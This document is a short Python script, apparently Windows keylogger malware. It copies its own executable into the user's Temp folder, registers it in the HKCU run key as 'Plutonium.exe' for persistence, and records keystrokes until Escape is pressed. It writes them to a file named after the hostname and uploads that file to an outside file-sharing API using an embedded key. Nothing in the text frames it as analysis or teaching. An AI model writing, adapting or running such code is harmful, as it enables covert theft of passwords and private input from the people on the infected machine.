import keyboard
import os
import register
import sys
script_path=sys.executable
script_path='"'+script_path+'"'
script_path_2='C:\\Users\\'+os.popen("echo %USERNAME%").read().strip('\n')+'\\AppData\\Local\\Temp'
copy= "copy "+script_path+script_path_2
os.system("copy "+script_path+' "'+
          script_path_2+'"')
register.register_hkcu(app_name="testREG", script_path=script_path_2+"\\Plutonium.exe")
recorded= keyboard.record(until = 'esc')
a=os.popen("hostname").read().strip('\n')
a='C:\\Users\\'+os.popen("echo %USERNAME%").read().strip('\n')+'\\Music\\'+a+".txt"
with open(a, 'w') as f:
    for event in recorded:
        if event.event_type==keyboard.KEY_DOWN:
            f.write(f'{event}\n')
f.close()        

import requests

url = "https://www.airforshare.com/apiv3/upload.php"

headers = {
    "X-Auth-Token": "",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
}

data = {
    "api_key": "webklsjfoi6jge3pgwe0few03",
    "owner_hash": "aBhTWiVnjP"
}

files = {
    "file": (a, open(a, "rb"), "text/plain")
}

response = requests.post(url, headers=headers, data=data, files=files)
